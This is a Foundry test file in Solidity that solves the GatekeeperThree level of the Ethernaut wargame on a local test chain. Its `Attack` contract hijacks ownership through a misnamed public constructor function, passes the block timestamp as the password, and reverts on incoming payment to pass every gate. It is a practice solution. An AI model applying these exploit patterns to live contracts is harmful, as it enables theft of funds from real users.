// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/28-GatekeeperThree/GatekeeperThreeFactory.sol";
import "../src/Ethernaut.sol";

contract GatekeeperThreeTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testGatekeeperThreeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperThreeFactory factory = new GatekeeperThreeFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        // GatekeeperThree level = GatekeeperThree(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        vm.roll(3);
        vm.warp(3);
        Attack hack = new Attack();
        hack.attack{value: 0.002 ether}(levelAddress);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    function attack(address target) external payable {
        GatekeeperThree keeper = GatekeeperThree(payable(target));
        keeper.construct0r();
        payable(target).call{value: msg.value}("");
        keeper.createTrick();
        keeper.getAllowance(block.timestamp);

        keeper.enter();        
    }

    receive() external payable {
        revert();
    }
}